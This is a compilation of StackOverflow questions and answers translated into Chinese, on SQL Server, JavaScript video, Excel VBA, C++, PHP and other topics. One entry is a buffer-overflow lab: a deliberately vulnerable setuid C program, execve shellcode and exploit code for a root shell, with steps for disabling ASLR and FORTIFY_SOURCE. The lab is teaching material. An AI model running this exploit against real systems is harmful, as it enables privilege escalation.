# StackOverflow 问答 14916000-14916999

# sql-server - 将数据库附加到 SQL Server 2008 R2 实例后，CDC 失败

> ID：14916000
> 
> 赞同：5
> 
> 时间：2013-02-16T22:50:50.180
> 
> 标签：sql-server, sql-server-2008, sql-server-2008-r2

我们在启用了 CDC（变更数据捕获）的 SQL Server 2008 R2 (SP 1) 上托管了一个 SQL Server 数据库。

由于许可证到期重新安装 SQL Server 实例后（部署团队忘记安装正确的许可证 :( ）我们将数据库附加到新安装的实例。

但是，当我们尝试通过执行启用它时，并没有为所有表启用 CDC

```
sys.sp_cdc_enable_table 
```

我们有

> *未为更改数据捕获启用数据库“DBName”。确保设置了正确的数据库上下文并重试该操作。要报告为更改数据捕获启用的数据库，请查询 sys.databases 目录视图中的 is_cdc_enabled 列。*

提示 CDC 未启用。

因此，我们尝试通过执行来启用它

```
sys.sp_cdc_enable_db 
```

我们收到以下错误：

> *消息 22906，级别 16，状态 1，过程 sp_cdc_enable_db_internal，第 49 行
> 无法为更改数据捕获启用数据库“DBName”，因为当前数据库中已存在名为“cdc”的数据库用户或名为“cdc”的架构。这些对象是变更数据捕获唯一需要的。删除或重命名用户或架构，然后重试该操作。*

尝试通过执行禁用 CDC 后

```
sys.sp_cdc_disable_db 
```

我们又得到了同样的错误：

> *未为更改数据捕获启用数据库“DBName”。确保设置了正确的数据库上下文并重试该操作。要报告为更改数据捕获启用的数据库，请查询 sys.databases 目录视图中的 is_cdc_enabled 列。*

我的猜测是 db 系统表和 SQL server 系统表之间存在一些不一致，导致 CDC 状态无效。

有没有办法解决这个问题？

任何想法表示赞赏。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-05-12T04:44:50.230

**嗨，要修复 Db（删除 cdc 架构和架构本身中的所有内容），请使用以下命令：**

```
DECLARE @tableName NVARCHAR(100);
DECLARE myCursor CURSOR FORWARD_ONLY FAST_FORWARD READ_ONLY
FOR
    SELECT  QUOTENAME(t.name) AS name
    FROM    sys.tables t
            JOIN sys.schemas s ON t.schema_id = s.schema_id
    WHERE   s.name = 'cdc'
OPEN myCursor 
FETCH FROM myCursor INTO @TableName 
WHILE ( @@Fetch_Status = 0 ) 
    BEGIN 

        EXEC ( 'drop table cdc.' + @TableName + '; ' );
        FETCH NEXT FROM myCursor INTO @TableName 
    END  
CLOSE myCursor 
DEALLOCATE myCursor;
go

DECLARE @prName NVARCHAR(100);
DECLARE myCursor2 CURSOR FORWARD_ONLY FAST_FORWARD READ_ONLY
FOR
    SELECT  QUOTENAME(pr.name) AS name
    FROM    sys.procedures pr
            JOIN sys.schemas s ON pr.schema_id = s.schema_id
    WHERE   s.name = 'cdc'
OPEN myCursor2 
FETCH FROM myCursor2 INTO @prName 
WHILE ( @@Fetch_Status = 0 ) 
    BEGIN 
        EXEC ( 'drop procedure cdc.' + @prName + '; ' );
        FETCH NEXT FROM myCursor2 INTO @prName 
    END  
CLOSE myCursor2
DEALLOCATE myCursor2 

GO

DECLARE @fnName NVARCHAR(100);
DECLARE myCursor3 CURSOR FORWARD_ONLY FAST_FORWARD READ_ONLY
FOR
    SELECT  QUOTENAME(fn.name) AS name
    FROM    sys.objects fn
            JOIN sys.schemas s ON fn.schema_id = s.schema_id
    WHERE   fn.type IN ( 'FN', 'IF', 'TF' )
            AND s.name = 'cdc'
OPEN myCursor3 
FETCH FROM myCursor3 INTO @fnName 
WHILE ( @@Fetch_Status = 0 ) 
    BEGIN 
        EXEC ( 'drop function cdc.' + @fnName + '; ' );
        FETCH NEXT FROM myCursor3 INTO @fnName 
    END  
CLOSE myCursor3
DEALLOCATE myCursor3 
go
DECLARE @ruleName NVARCHAR(100);
SELECT  @ruleName = DP1.name
FROM    sys.database_principals AS DP1
        JOIN sys.database_principals AS DP2 ON DP1.owning_principal_id = DP2.principal_id
WHERE   DP1.type = 'R'
        AND DP2.name = 'cdc';
EXEC ('ALTER AUTHORIZATION ON ROLE::'+@ruleName+' TO dbo; ')
go 
DROP SCHEMA [cdc]
GO
DROP USER [cdc]
GO 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T00:24:21.923

我还遇到了处理 CDC 启用/禁用的糟糕方式。如果我是你，我会尝试删除 cdc 架构和架构本身中的所有内容，并尝试再次在数据库中启用 CDC。或者，如果您正在恢复（而不是附加），则有一个 KEEP_CDC 选项。

# javascript - 除非已经播放，否则视频播放器不会在 src 更改时播放

> ID：14916002
> 
> 赞同：0
> 
> 时间：2013-02-16T22:50:59.387
> 
> 标签：javascript, html, html5-video

我有一个带缩略图的视频播放器。我希望视频播放器开始播放所选视频。但是，除非视频已经在播放，否则它不会起作用。所以我需要先点击播放按钮，然后点击缩略图让它加注星标。如果页面加载并且我点击缩略图，它将无法播放。

这是我的网站：[http ://www3.carleton.ca/clubs/sissa/html5/video.html](http://www3.carleton.ca/clubs/sissa/html5/video.html)

HTML：

```
<div id="playlist" class="animated fadeInRight">
    <div class="thumb" id="tb1"><img src="images/thumbnails/TbGow.jpg" onClick="changeTrailer('media/vGow')"/></div>
    <div class="thumb" id="tb2"><img src="images/thumbnails/TbLast.jpg" onClick="changeTrailer('media/vLast')"/></div>
    <div class="thumb" id="tb3"><img src="images/thumbnails/TbTwo.jpg" onClick="changeTrailer('media/vTwo')"/></div>
</div> 
```

JS：

```
function changeTrailer(source){ 
    playlist = document.getElementById('playlist');
    var source1 = media.children[0]; 
    var source2 = media.children[1]; 
    source1.src = source+'.mp4'; 
    source2.src = source+'.webm'; 

    media.load(); 
    //Reseting control bar elements 
    window.clearInterval(updateBar);
    media.play(); //call play function so it resets timer
    dimScreen();
    playButton.firstChild.src = "images/icons/pause.png";
    updateBar=setInterval(update, 100);
    playlist.style.opacity = '0';
}
function playPause(){
    if (!media.paused) { // if currently playing (or ended?)
        if (media.ended) { // if at the end
            media.currentTime = 0; // go to start 
            lightScreen();
        } else { // else
            media.pause(); // pause
            playButton.firstChild.src = "images/icons/play.png";
            window.clearInterval(updateBar);
            lightScreen();
            return; // and end function here
        }
    } // then if function didn't end
    media.play(); // resume playing
    dimScreen();
    playButton.firstChild.src = "images/icons/pause.png";
    updateBar=setInterval(update, 100);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T23:22:04.293

尝试更改`window.clearIntreval(updateBar)`为`if ( typeof updateBar !== 'undefined' && updateBar ) window.clearInterval(updateBar);`.

# excel - VBA代码中的Excel公式

> ID：14916003
> 
> 赞同：3
> 
> 时间：2013-02-16T22:51:20.457
> 
> 标签：excel, excel-formula, vba

所以，在 Sheet1 我有一些名字的基础，它看起来像这样：

![在此处输入图像描述](../Images/4ddd3d97af01bd689c4b90ca0712fa97.png)

在 Sheet2 中，我正在使用来自 Sheet1 的这些名称。我这样做的方式是在 A 列中输入代码值，在 BI 列中获取名称，在 CI 列中获取姓氏。看起来像这样：

![在此处输入图像描述](../Images/cd11312a2b28db98145a99973426ab2a.png)

我已经用公式完成了这个，在公式栏中输入它。对于 A 列（或名称），我使用了这个公式：`=IFERROR(VLOOKUP(A2;Sheet1!A:C;2;FALSE);"")`而对于 B 列（或姓氏），我使用了这个：`=IFERROR(VLOOKUP(A2;Sheet1!A:C;3;FALSE);"")`。我已将这些公式拖到第 20 行，效果很好。

现在，我想做的是将这些公式放入 Excel VBA 代码中，并使其适用于指定的范围。我刚刚开始使用 VBA，但我不知道如何在其中使用，尝试了一些但不起作用，...，到目前为止我已经做到了。我是这个 Excel/Macro/VBA 的新手，所以任何帮助都将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T22:00:02.770

如果我正确理解您的问题和评论，您希望确保 B&C 列始终根据您的公式向您显示正确的值，但还希望保护（甚至可能隐藏公式）不让用户看到。

我建议您改用工作表保护：您需要做的就是解锁您希望用户编辑的单元格，即选择 A 列并在_格式化单元格_对话框中取消选中*保护*选项卡中的“锁定”。同样，对于 B&C 列，选中“隐藏”。现在右键单击工作表名称并选择*Protect Sheet*。完成此操作后，用户可以编辑 A 列 - 但不会在 B&C 中看到公式，也无法编辑这些单元格。

如果由于某些原因您需要在 VBA 中确保这一点，请使用以下代码：

```
Private Sub Worksheet_Change(ByVal Target As Range)
    Application.EnableEvents = False 'to prevent endless loop
    With Target.Offset(, 2 - Target.Column).Resize(, 2)
        .FormulaR1C1 = "=IFERROR(VLOOKUP(RC1,Sheet1!C1:C3,COLUMN(RC),0),"""")"
        .Value = .Value
    End With
    Application.EnableEvents = True
End Sub 
```

您需要将其放在工作表的模块中。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-17T05:27:16.997

如果您输入`Code`值`sheet2`并突出显示它们，然后运行此宏，则以下代码将起作用：

```
Selection.Offset(0, 1).FormulaR1C1 = "=IFERROR(VLOOKUP(RC[-1],Sheet1!C[-1]:C,2,FALSE),"""")"
Selection.Offset(0, 2).FormulaR1C1 = "=IFERROR(VLOOKUP(RC[-2],Sheet1!C[-2]:C,3,FALSE),"""")"
Selection.Offset(0, 1).Value = Selection.Offset(0, 1).Value
Selection.Offset(0, 2).Value = Selection.Offset(0, 2).Value 
```

**编辑：**如果您想在键入时更新值，请使用（感谢@PeterAlbert 增加优化！）：

```
Private Sub Worksheet_Change(ByVal Target As Range)

    'end if the user made a change to more than one cell at once?
    If Target.Count > 1 Then End

    'stop system activating worksheet_change event while changing the sheet
    Application.EnableEvents = False

    'continue if column 1(A) was updated
    'and
    'dont continue if header or row 1 was changed
    If Target.Column = 1 And Target.Row <> 1 Then

        With Target.Offset(0, 1) 'alter the next cell, current column +1 (column B)

            'RC1 = current row and column 1(A) e.g. if A2 was edited, RC1 = $B2
            'C1:C2 = $A:$B
            .FormulaR1C1 = "=IFERROR(VLOOKUP(RC1,Sheet1!C1:C2,2,FALSE),"""")"
            .Value = .Value 'store value
        End With

        With Target.Offset(0, 2) 'alter the next cell, current column +2 (column C)

            'C1:C3 = $A:$C
            .FormulaR1C1 = "=IFERROR(VLOOKUP(RC1,Sheet1!C1:C3,3,FALSE),"""")"
            .Value = .Value 'store value
        End With

    End If

    Application.EnableEvents = True 'reset system events
End Sub 
```

**RC的解释：**

当`FormulaR1C1`引用一个相对于当前单元格的单元格时，公式类型非常适合使用。有几条规则要记住：

*   The`R`代表 Row 并且`C`是 Column 和它后面的整数，如果有的话，定义行或列；
*   作为基础，`RC`公式引用自身；
*   `R`或`C`包裹在后面的任何数字`[]`都是对自身的偏移，例如，如果您在单元格中`A1`并使用`R[1]C[1]`，您将引用单元格`B2`；
*   此外，`R`and之后的任何数字`C`都是精确的，例如，如果您引用`R2C2`无论您在哪个单元格中，都将指向`B2`; 和

如果您在 cell 中，会使事情复杂化`C5`，例如使用`Range("C5").FormulaR1C1 =`和编码以下内容：

1.  `"=RC[-1]"`参考单元格`B5`
2.  `"=RC1"`引用单元格`A5`，更正确`$A5`
3.  `"=R[1]C[-2]"`参考单元格`A6`
4.  `"=Sum(C[-1]:C5)"`更`=Sum(B:E)`正确的是`=Sum(B:$E)`

# c - 缓冲区溢出漏洞实验室问题

> ID：14916004
> 
> 赞同：1
> 
> 时间：2013-02-16T22:51:28.247
> 
> 标签：c, security, buffer-overflow, fortify-source

我有一个实验室任务，我被困住了。基本上，我必须利用缓冲区溢出来生成具有 root 权限的 shell。我必须使用 2 个单独的 .c 文件。这是第一个：stack.c

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int bof(char *str)
{
    char buffer[12];

    //BO Vulnerability
    strcpy(buffer,str);

    return 1;
}

int main(int argc, char* argv[])
{
    char str[517];

    FILE *badfile;
    badfile = fopen("badfile","r");

    fread(str, sizeof(char),517, badfile);
    bof(str);

    printf("Returned Properly\n");
    return 1;
} 
```

这是第二个：exploit.c

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
"\x31\xc0"              /* xorl    %eax,%eax              */
"\x50"                  /* pushl   %eax                   */
"\x68""//sh"            /* pushl   $0x68732f2f            */
"\x68""/bin"            /* pushl   $0x6e69622f            */
"\x89\xe3"              /* movl    %esp,%ebx              */
"\x50"                  /* pushl   %eax                   */
"\x53"                  /* pushl   %ebx                   */
"\x89\xe1"              /* movl    %esp,%ecx              */
"\x99"                  /* cdql                           */
"\xb0\x0b"              /* movb    $0x0b,%al              */    
"\xcd\x80"              /* int     $0x80                  */
;
void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;
    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);
/* You need to fill the buffer with appropriate contents here */
/* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
} 
```

我只能修改第二个。以下是我所做的更改：

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define DEFAULT_OFFSET 350 

char shellcode[]=
"\x31\xc0"              /* xorl    %eax,%eax              */
"\x50"                  /* pushl   %eax                   */
"\x68""//sh"            /* pushl   $0x68732f2f            */
"\x68""/bin"            /* pushl   $0x6e69622f            */
"\x89\xe3"              /* movl    %esp,%ebx              */
"\x50"                  /* pushl   %eax                   */
"\x53"                  /* pushl   %ebx                   */
"\x89\xe1"              /* movl    %esp,%ecx              */
"\x99"                  /* cdql                           */
"\xb0\x0b"              /* movb    $0x0b,%al              */    
"\xcd\x80"              /* int     $0x80                  */

unsigned long get_sp(void)
{
    __asm__("movl %esp,%eax");
}

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;
    char *ptr;
    long *a_ptr,ret;

    int offset = DEFAULT_OFFSET;
    int codeSize = sizeof(shellcode);
    int buffSize = sizeof(buffer);

    if(argc > 1) offset = atoi(argv[1]); //allows for command line input

    ptr=buffer;
    a_ptr = (long *) ptr;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(buffer, 0x90, buffSize);

//----------------------BEGIN FILL BUFFER----------------------\\

    ret = get_sp()+offset;
    printf("Return Address: 0x%x\n",get_sp());
    printf("Address: 0x%x\n",ret);

    ptr = buffer;
    a_ptr = (long *) ptr;

    int i;
    for (i = 0; i < 300;i+=4)
    {
        *(a_ptr++) = ret;
    }

    for(i = 486;i < codeSize + 486;++i)
    {
        buffer[i] = shellcode[i-486];
    {
    buffer[buffSize - 1] = '\0';
//-----------------------END FILL BUFFER-----------------------\\

/* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer,517,1,badfile);
    fclose(badfile);    
} 
```

然后我从命令行执行以下

```
$ su root
$ Password (enter root password)
# gcc -o stack -fno-stack-protector stack.c
# chmod 4755 stack
# exit
$ gcc -o exploit exploit.c
$./exploit
$./stack 
```

然而，虽然它确实会生成一个包含实际数据和外壳的“坏文件”，但该外壳仅具有基本用户权限。之前，我确实在 root 中执行了以下操作：

```
echo 0 > /proc/sys/kernel/randomize_va_space 
```

实验室说我需要在 root 中执行以下操作：

```
sysctl -w kernel.randomize_va_space=0 
```

但是，如果我这样做，那么当我执行“堆栈”时，我会收到“非法指令”错误。有人可以帮我解决这个问题吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T23:09:40.580

我弄清楚了问题所在。我必须将 zsh 链接到 /bin/bash/。我跳过了那个，因为我认为只有在使用 Fedora 时我才需要这样做。我使用的是 Ubuntu。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-09-12T13:14:43.270

> ```
>  strcpy(buffer, str); 
> ```

在测试期间您需要解决的一件事是这个函数调用。

`memcpy`FORTIFY_SOURCE 使用和等高风险函数的“更安全”变体`strcpy`。当编译器可以推断目标缓冲区大小时，它会使用更安全的变体。如果副本超出目标缓冲区大小，则程序调用`abort()`.

要为您的测试禁用 FORTIFY_SOURCE，您应该使用`-U_FORTIFY_SOURCE`或编译程序`-D_FORTIFY_SOURCE=0`。

# c++ - MoveInsertable 和 CopyInsertable 之间的区别？

> ID：14916005
> 
> 赞同：6
> 
> 时间：2013-02-16T22:51:39.257
> 
> 标签：c++, compiler-construction, c++11

有人可以对这两个术语提供更清晰的解释吗？

换句话说，请用一个例子进行一些简单的解释。

> （来自：cppreference.com）
> 
> MoveInsertable ：指定可以将类型的右值复制到未初始化的存储中。
> 
> CopyInsertable ：指定可以在未初始化的存储中就地复制构造该类型的实例。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-16T23:07:12.647

`T`这些需求是类型和容器之间的关系`X`。容器有一个分配器类型 ，`A`它用于为其包含的对象分配内存。

If`m`是这些分配器之一，`p`a `T*`，`rv`类型的右值和类型`T`的`v`表达式`T`：

1.  `CopyInsertable`由标准定义：

    > `T`is `CopyInsertable`into`X`表示以下表达式是合式的：
    > 
    > ```
    > allocator_traits<A>::construct(m, p, v); 
    > ```

2.  `MoveInsertable`由标准定义：

    > `T`is `MoveInsertable`into`X`表示以下表达式是合式的：
    > 
    > ```
    > allocator_traits<A>::construct(m, p, rv); 
    > ```

现在要理解这些定义，我们必须知道是什么`allocator_traits<A>::construct`。很简单，在这种情况下，它调用：

```
m.construct(p, v) // CopyInsertable case
m.construct(p, rv) // MoveInsertable case 
```

^(`v`并且`rv`在这里仍然有它们各自的值类别，因为`std::forward`应用于`allocator_traits<A>::construct`.)

那么分配器`construct`成员函数有什么作用呢？好吧，正如您所料，它通过执行以下操作`T`在该位置构造一个类型的对象：`p`

```
::new ((void*)p) T(v) // CopyInsertable case
::new ((void*)p) T(rv) // MoveInsertable case 
```

^(再次，并被`v`编辑。`rv``std::forward`)

当然，这些将分别调用复制或移动构造函数。

所以：

1.  **`T`is `CopyInsertable`into`X`**：canplacement `X`-new 的分配器构造一个元素`T`，传递一个类型的表达式`T`
2.  **`T`is `MoveInsertable`into`X`**：canplacement `X`-new 的分配器构造一个元素`T`，传递一个类型的右值`T`

# delphi - 如何使用 rtti 将值设置为动态数组？

> ID：14916006
> 
> 赞同：0
> 
> 时间：2013-02-16T22:51:41.290
> 
> 标签：delphi, rtti, dynamic-arrays

我正在尝试这种方式，但是大小仍然为 0

```
 v := _RttiFld.GetValue(obj);
  P := v.GetReferenceToRawData;
  idx := 2; //to test
  DynArraySetLength(p,v.TypeInfo,1,@idx);
  Assert(_RttiFld.GetValue(obj).GetArrayLength > 0); 
```

我的字段是一个动态的字符串数组

```
FMensage : array of string; 
```

# android - 无缝的 Android 原生 (c++) 和 java 调试

> ID：14916010
> 
> 赞同：1
> 
> 时间：2013-02-16T22:52:05.933
> 
> 标签：android, debugging

我对 Android 开发相当陌生，但我正在寻找一个无缝的 Android c++ 和 java 调试环境。

我的初步研究表明，NVidia 可能是唯一通过 Visual Studio提供此功能的工具集 ( [https://developer.nvidia.com/nvidia-debug-manager-android-ndk )。](https://developer.nvidia.com/nvidia-debug-manager-android-ndk)

不太无缝的是，VisualGDB 和 Eclipse 可以一起使用（[http://visualgdb.com/tutorials/android/codebug/](http://visualgdb.com/tutorials/android/codebug/)），通过使用 VisualGDB 来调试 c++ 和 Eclipse 来调试 java。

我还读到 Eclipse 具有调试 c++ 和 java 的能力，但它们不能同时完成。

WinGDB 应该能够调试 c++ 和 java，但不能同时调试 ( [http://www.wingdb.com/docs/pages/wga_dbgjava.htm](http://www.wingdb.com/docs/pages/wga_dbgjava.htm) )。

最后，IntellJ IDEA 可能可以同时使用 c++ 插件，但我不知道是否可以同时调试 java 和 c++。

有人尝试过这些不同的解决方案吗？如果是这样，他们的效果如何？你能提供任何特定解决方案的优缺点吗？

# sql - 在 select 语句中将连接查询重述为相关子查询

> ID：14916012
> 
> 赞同：2
> 
> 时间：2013-02-16T22:52:10.697
> 
> 标签：sql, sql-server-2008

作为练习作业，我希望将连接重写为 select 子句中的子查询。我知道 select 语句中的子查询必须返回一个值，我很难弄清楚如何以一种有意义的方式重写它。

这是原始的连接语句：

```
SELECT InvoiceNumber, InvoiceDate, InvoiceLineItemAmount
FROM Invoices JOIN InvoiceLineItems
  ON Invoices.InvoiceID = Invoicelineitems.InvoiceID
WHERE VendorID = 122
ORDER BY InvoiceDate 
```

任何提示或帮助将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T23:04:15.847

我的提示是在您的主查询中使用 InvoiceLineItems，在子查询中使用 Invoices。这将增加您的子查询恰好返回一行的可能性。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-16T23:05:39.370

`ON`您只需将条件放在`WHERE`子查询的子句中，而不是使用子句。

```
SELECT InvoiceNumber, InvoiceDate,
       (SELECT InvoiceLineItemAmount
        FROM InvoiceLineItems
        WHERE Invoices.InvoiceID = Invoicelineitems.InvoiceID)
          AS InvoiceLineItemAmount
FROM Invoices
WHERE VendorID = 122
ORDER BY InvoiceDate 
```

如果您的子查询返回多个值，那么您有几个选择。

你可以抓住`TOP 1`

```
SELECT InvoiceNumber, InvoiceDate,
       (SELECT TOP 1 InvoiceLineItemAmount
        FROM InvoiceLineItems
        WHERE Invoices.InvoiceID = Invoicelineitems.InvoiceID)
          AS InvoiceLineItemAmount
FROM Invoices
WHERE VendorID = 122
ORDER BY InvoiceDate 
```

您可以使用聚合函数

```
SELECT InvoiceNumber, InvoiceDate,
       (SELECT MAX(InvoiceLineItemAmount)
        FROM InvoiceLineItems
        WHERE Invoices.InvoiceID = Invoicelineitems.InvoiceID)
          AS InvoiceLineItemAmount
FROM Invoices
WHERE VendorID = 122
ORDER BY InvoiceDate 
```

或者您可以使用 XML 连接结果

```
SELECT InvoiceNumber, InvoiceDate,
       STUFF((
           SELECT ', ' + LTRIM(InvoiceLineItemAmount)
           FROM InvoiceLineItems
           WHERE Invoices.InvoiceID = Invoicelineitems.InvoiceID
           FOR XML PATH('')),
           1, 2, '') AS InvoiceLineItemAmount
FROM Invoices
WHERE VendorID = 122
ORDER BY InvoiceDate 
```

或者，对于@MartinSmith，您可以反转关系并改为挂起 InvoiceLineItems。但是，在不知道您的架构约束的情况下，您可能会遇到同样的`returns more than one value`问题。

```
SELECT (SELECT InvoiceNumber
        FROM InvoiceLineItems
        WHERE Invoices.InvoiceID = Invoicelineitems.InvoiceID)
            AS InvoiceNumber,
       (SELECT InvoiceDate
        FROM InvoiceLineItems
        WHERE Invoices.InvoiceID = Invoicelineitems.InvoiceID)
            AS InvoiceDate
       InvoiceLineItemAmount
FROM InvoiceLineItems
WHERE VendorID = 122
ORDER BY InvoiceDate 
```

最后，这一切都取决于您的要求。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-16T23:04:22.657

如果在子查询中多于一行，则需要[TOP](http://msdn.microsoft.com/en-us/library/ms189463.aspx)子句

```
SELECT InvoiceNumber, InvoiceDate, 
 (
  SELECT InvoiceLineItemAmount
  FROM InvoiceLineItems
  WHERE Invoices.InvoiceID = Invoicelineitems.InvoiceID
  ) AS InvoiceLineItemAmount 
FROM Invoices
WHERE VendorID = 122
ORDER BY InvoiceDate 
```

# arrays - 来自节点阵列的 Seg 故障

> ID：14916013
> 
> 赞同：0
> 
> 时间：2013-02-16T22:52:20.397
> 
> 标签：arrays, pointers, segmentation-fault

我正在做一个项目，我正在尝试将节点数组构建为堆，以便在数组的每个索引中，我可以存储名称和值。本质上，我希望我的构造函数将第一个索引的值设置为 -1，以便稍后我可以判断它是否为空（-1 的值表示空索引）。

问题是我遇到了段错误，我不知道为什么。这是错误的代码：

头文件：

```
class tripe
{

 public:

  tripe();
  void initialize(string filename); //initialize tripe data struct
  void insert(string name, int grade); //insert given pair into structure
  void search(string prefix); //print list of entries that matches prefix
  void findMin(); //print min grade entry
  void buildheap(string name,string grade,int size);

  heapnode *heap[100]; //TROUBLESOME VARIABLE
  trinode *head;
  trinode *let[25];

};

class heapnode
{

 public:

  string student;
  int score; //WANT THIS TO BE -1 FOR FIRST INDEX OF HEAP ARRAY
}; 
```

C++ 文件：

```
tripe::tripe()
{
 for (int i = 0; i < 100; i++)
    {
      heap[i] = NULL;
    }

  heap[1]->score = -1; //SEG FAULT
} 
```

事实上，我注意到，每当尝试访问堆数组中的 score 变量时，我都会得到一个 segault。我的构造函数需要做其他事情吗？对此问题的任何帮助将不胜感激！

PS 我需要为这个项目使用一个节点数组，所以我的堆的实现不能改变。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T18:41:58.130

您将 NULL 存储在堆 [1] 中。当您通过 NULL 间接时，您会遇到分段错误。这就是应该发生的事情。heap 不是节点数组，而是指向节点的指针数组。如果这是故意的，那么您必须在实际使用这些指针之前为这些指针分配一些内存以指向它们。既然您说您需要使用“节点数组”，我猜这是真的，因此您需要将声明更改为 heapnode 类型的数组：

```
heapnode heap[100]; 
```

那么你的构造函数可能看起来像这样：

```
tripe::tripe()
{
 for (int i = 0; i < 100; i++)
    {
      heap[i].score = -1;
    }
} 
```

显然，对堆中节点的任何其他引用都必须更改为使用“.”。运算符而不是“->”。

# php - 条件导致代码失败

> ID：14916021
> 
> 赞同：2
> 
> 时间：2013-02-16T22:52:47.960
> 
> 标签：php

我正在编写一个小的电子邮件到文本的脚本，似乎每次我将“doMail()”函数包装在 if 语句中时，它都会失败，或者在函数内，如果我将 mail() 函数包装为一个 if 语句，它也失败了。

但是，如果我删除条件，它就像一个魅力？我应该怎么做，这可能是什么原因？

编辑：通过“......它失败了”，我的意思是它呼应了“出了点问题！” 就像它应该根据代码一样。

这是代码：

```
<?php
error_reporting(E_ALL);
session_start();
if (!$_SESSION['doesExist'] == true) 
    {
        echo "Session doesn't exist!";
        die();
    }

if (!isset($_POST['num']) || !isset($_POST['carrier']) || !isset($_POST['msg'])) 
    {
        echo "Failed!";
        die();
    }

$num = $_POST['num'];
$car = $_POST['carrier'];
$msg = $_POST['msg'];
$subject = '';
$head = 'From: admin@google.com' . "\r\n";

switch ($car)
    {
        case "att":
            $num .= "@txt.att.net";
            break;
        case "verizon":
            $num .= "@vtext.com";
            break;
        case "tmobile":
            $num .= "@tmomail.net";
            break;
    }

function doMail($toNum, $sub, $message, $headers)
    {
        if(mail($toNum, $sub, $message, $headers))
            {
                echo "Done!";
            }
        else
            {
                echo "Something went wrong!";
            }
    }

doMail($num, $subject, $msg, $head);

?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T23:15:43.867

显然，根据此[注释](http://us3.php.net/manual/en/function.mail.php#109655)，该`mail()`函数可能会返回一个空字符串而不是布尔值，`TRUE`因此将`FALSE`在条件语句中进行评估，因为考虑了一个空值`FALSE`。

# c++ - 提升两个线程

> ID：14916024
> 
> 赞同：0
> 
> 时间：2013-02-16T22:52:58.740
> 
> 标签：c++, multithreading, boost, boost-thread

关于循环的 C++ Boost 问题。

因此，我一直在尽可能多地查看信息，但仍然没有看到任何关于我正在尝试做的事情或其工作原理的示例。

几年来，我一直在业余时间用 C++ 设计游戏。我得到了用于游戏逻辑的核心引擎，以及一个粗略的输入系统，并使用 OpenGL 和 AL 进行输出。我想要做的是弄清楚如何让我的引擎启动，然后在单独的线程中运行我的输入系统、图形引擎和声音系统。并同时运行。下一步是同步我的线程，但我无法让线程一起运行。

```
boost::thread gTrd(boost::bind(&game::runGraphics, this));
gTrd.join();
boost::thread sTrd(boost::bind(&game::runSound, this));
sTrd.join();
boost::thread iTrd(boost::bind(&game::runInput, this));
iTrd.join();
boost::thread cTrd(boost::bind(&game::runCore, this));
cTrd.join(); 
```

这就是我到目前为止所得到的。据我所知，问题是 gTrd 中的图形引擎有一个无限循环，假设会一直运行到程序终止，所以我启动了空白屏幕，但它从不启动 strd。

究竟需要什么才能运行我的线程，这些线程理论上是无限线程？此外，在内存泄漏方面我需要注意的任何潜在问题都非常棒。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T23:08:21.403

你知道做什么`join()`吗？当你调用它时，它会阻塞主线程，直到调用 join 的线程完成。在您的代码中，您启动一​​个线程，调用 join 以等待它完成，然后启动另一个线程并重复此过程。调用`detach()`以允许继续执行（并且您不在乎线程何时完成执行）或`join()`在启动所有线程后调用（取决于您的需要）。

**注意：**您只想等到线程**完成**执行时才调用join。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T00:08:29.383

`join()`一旦您希望它们停止运行，您应该只使用所有线程。正如您所说，每个线程都在某种无限循环中运行，因此当您`join()`在要求线程停止运行之前调用时，您的主线程将永远不会恢复其运行。

相反，您应该首先告诉您希望它们完成运行的线程。这是伪代码中的一个简单机制，可以满足您的要求：

```
RunGame() 
{
    initialize_all_threads(); //just like your sample code does minus the join functions
    ...//do stuff while game is running
    wait_for_quit_signal_from_input_thread(); //note that the input thread is the only thread which transfers messages back to the main thread
    //quit signal received, so we should quit game
    signal_all_threads_exit(); //via some kind of flag/synchronization object which all thread "main loops" are listening on
    join_all_threads(); //wait for threads to gracefully end, perhaps with a timeout

} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-17T07:45:33.930

为什么不直接转储所有的 join() 呢？

```
boost::thread gTrd(boost::bind(&game::runGraphics, this));
boost::thread sTrd(boost::bind(&game::runSound, this));
boost::thread iTrd(boost::bind(&game::runInput, this));
game::runCore(); 
```

# jquery - JQM关闭多选对话框将重复浏览器后退按钮事件

> ID：14916029
> 
> 赞同：0
> 
> 时间：2013-02-16T22:53:55.403
> 
> 标签：jquery, jquery-mobile, multi-select

现在 3 天我正试图绕过这个 pb，在网络上搜索和 SO。

**问题：**从第 1 页转到第 2 页，然后转到第 3 页，在第 3 页中打开一个多项选择并关闭它。然后按浏览器后退按钮返回第 2 页...并立即返回第 1 页（就像按两次后退按钮一样）。多项选择必须全屏显示 pb 才能发生，这解释了为什么我的样本有这么多`<option>`.

我在这 3 个 html 文件中隔离了 pb：

**page1.html**

```
<html>
<head>
    <link rel="stylesheet" href="http://code.jquery.com/mobile/1.2.0/jquery.mobile-1.2.0.min.css" />
    <script src="http://code.jquery.com/jquery-1.8.2.min.js"></script>
